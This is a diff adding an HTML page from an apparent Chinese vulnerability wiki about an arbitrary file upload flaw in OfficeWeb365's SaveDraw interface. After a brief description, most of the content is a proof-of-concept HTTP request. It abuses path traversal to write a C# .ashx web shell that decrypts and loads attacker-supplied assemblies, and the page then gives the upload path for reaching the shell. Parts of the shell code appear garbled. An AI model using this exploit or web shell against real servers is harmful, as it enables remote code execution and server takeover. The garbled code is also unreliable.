@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OfficeWeb365/OfficeWeb365%20SaveDraw%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>OfficeWeb365 SaveDraw 任意文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "OfficeWeb365 SaveDraw \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../OfficeWeb365%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../OfficeWeb365%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        OfficeWeb365 文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../OKLite/%EF%BC%88CVE-2019-16132%EF%BC%89%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../OKLite/%EF%BC%88CVE-2019-16132%EF%BC%89%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CVE-2019-16132） OKLite v1.2.25 存在任意文件删除漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="officeweb365-savedraw">OfficeWeb365 SaveDraw 任意文件上传漏洞<a class="headerlink" href="#officeweb365-savedraw" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>OfficeWeb365 SaveDraw 接口存在任意文件上传漏洞，攻击者通过漏洞可以在服务器中上传任意文件获取服务器权限</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>OfficeWeb365 </a-checkbox></br></p>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>"OfficeWeb365"</a-checkbox></br></p>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>产品页面</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1665984265863-0522ce25-d026-4e30-9ddc-4f690b84b19d.png" /></p>
+<p>验证POC</p>
+<div class="highlight"><pre><span></span><code><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">PW</span><span class="o">/</span><span class="n">SaveDraw</span><span class="o">?</span><span class="n">path</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">Content</span><span class="o">/</span><span class="n">img</span><span class="o">&amp;</span><span class="n">idx</span><span class="o">=</span><span class="mf">6.</span><span class="n">ashx</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span><span class="w"> </span><span class="n">Intel</span><span class="w"> </span><span class="n">Mac</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">X</span><span class="w"> </span><span class="mi">10_15_7</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="mf">88.0.434.18</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">990</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span>
+<span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span>
+
+<span class="nl">data</span><span class="p">:</span><span class="n">image</span><span class="o">/</span><span class="n">png</span><span class="p">;</span><span class="n">base64</span><span class="p">,</span><span class="mo">01</span><span class="n">s34567890123456789y12345678901234567m91</span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">WebHandler</span><span class="w"> </span><span class="n">Language</span><span class="o">=</span><span class="s">&quot;C#&quot;</span><span class="w"> </span><span class="n">Class</span><span class="o">=</span><span class="s">&quot;Handler&quot;</span><span class="w"> </span><span class="o">%&gt;</span><span class="n">using</span><span class="w"> </span><span class="n">System</span><span class="p">;</span><span class="n">using</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">I0</span><span class="p">;</span><span class="n">using</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">Reflection</span><span class="p">;</span><span class="n">using</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">Text</span><span class="p">;</span><span class="n">using</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">Web</span><span class="p">;</span><span class="n">using</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">WebSessionState</span><span class="p">;</span><span class="n">using</span><span class="o">&amp;</span><span class="n">System</span><span class="p">.</span><span class="na">Security</span><span class="p">.</span><span class="na">Cryptography</span><span class="p">;</span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Handler</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">IHttpHandler</span><span class="p">,</span><span class="n">IRequiresSessionState</span><span class="p">{</span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="o">=&amp;</span><span class="n">ProcessRequest</span><span class="p">(</span><span class="n">HttpContext</span><span class="w"> </span><span class="n">context</span><span class="p">){</span><span class="k">try</span><span class="p">{</span><span class="n">string</span><span class="w"> </span><span class="n">key</span><span class="o">=</span><span class="s">&quot;900bc885d7553375&quot;</span><span class="p">;</span><span class="n">byteDk</span><span class="o">=&amp;</span><span class="n">Encoding</span><span class="p">.</span><span class="na">Default</span><span class="p">.</span><span class="na">GetBytes</span><span class="p">(</span><span class="n">key</span><span class="p">);</span><span class="n">context</span><span class="p">.</span><span class="na">Session</span><span class="p">.</span><span class="na">AddC</span><span class="s">&quot;sky&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">);</span><span class="n">StreamReader</span><span class="w"> </span><span class="n">sr</span><span class="o">=</span><span class="k">new</span><span class="o">&amp;</span><span class="n">StreamReader</span><span class="p">(</span><span class="n">contextRequest</span><span class="p">.</span><span class="na">InputStream</span><span class="p">);</span><span class="n">string</span><span class="w"> </span><span class="n">line</span><span class="o">=</span><span class="n">sr</span><span class="p">.</span><span class="na">ReadLine</span><span class="p">;</span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">string</span><span class="p">.</span><span class="na">IsNullOrEmpty</span><span class="p">(</span><span class="n">line</span><span class="p">)){</span><span class="n">byteDc</span><span class="o">=&amp;</span><span class="n">Convert</span><span class="p">.</span><span class="na">FromBase64String</span><span class="p">(</span><span class="n">line</span><span class="p">);</span><span class="n">Assembly</span><span class="w"> </span><span class="n">assembly</span><span class="o">=&amp;</span><span class="n">typeof</span><span class="p">(</span><span class="n">Environment</span><span class="p">).</span><span class="na">Assembly</span><span class="p">;</span><span class="n">RijndaelManaged</span><span class="w"> </span><span class="n">rm</span><span class="o">=</span><span class="p">(</span><span class="n">RijndaelManaged</span><span class="p">)</span><span class="o">&amp;</span><span class="n">assembly</span><span class="p">.</span><span class="na">CreateInstance</span><span class="p">(</span><span class="s">&quot;System.Secur&quot;</span><span class="o">+</span><span class="s">&quot;ityCrypto&quot;</span><span class="o">+</span><span class="s">&quot;graphy.Rijnda&quot;</span><span class="o">+</span><span class="s">&quot;elm anaged&quot;</span><span class="p">);</span><span class="kt">byte</span><span class="o">[</span><span class="w"> </span><span class="n">data</span><span class="o">=</span><span class="n">rm</span><span class="p">.</span><span class="na">CreateDecryptorCk</span><span class="p">,</span><span class="n">k</span><span class="p">)</span><span class="n">TransformFinalBlock</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">Length</span><span class="p">);</span><span class="n">Assembly</span><span class="p">.</span><span class="na">Load</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="n">CreateInstance</span><span class="p">(</span><span class="s">&quot;U&quot;</span><span class="p">).</span><span class="na">Equals</span><span class="p">(</span><span class="n">context</span><span class="p">);</span><span class="n">sr</span><span class="p">.</span><span class="na">clo</span><span class="w"> </span><span class="nf">se</span><span class="p">();}}</span><span class="k">catch</span><span class="w"> </span><span class="p">{}}</span><span class="kd">public</span><span class="w"> </span><span class="n">bool</span><span class="w"> </span><span class="n">IsReusable</span><span class="p">{</span><span class="n">get</span><span class="p">{</span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;}}}}</span><span class="o">---</span>
+</code></pre></div>
+<p><img alt="img" src="../../../.vuepress/public/img/1665984405457-e01e0fa8-4ddd-4998-ab86-f0d3c6200283.png" /></p>
+<p>上传地址</p>
+<div class="highlight"><pre><span></span><code><span class="o">/</span><span class="n">Content</span><span class="o">/</span><span class="n">img</span><span class="o">/</span><span class="n">UserDraw</span><span class="o">/</span><span class="n">drawPW6</span><span class="p">.</span><span class="na">ashx</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../OfficeWeb365%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../OfficeWeb365%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        OfficeWeb365 文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../OKLite/%EF%BC%88CVE-2019-16132%EF%BC%89%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../OKLite/%EF%BC%88CVE-2019-16132%EF%BC%89%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CVE-2019-16132） OKLite v1.2.25 存在任意文件删除漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
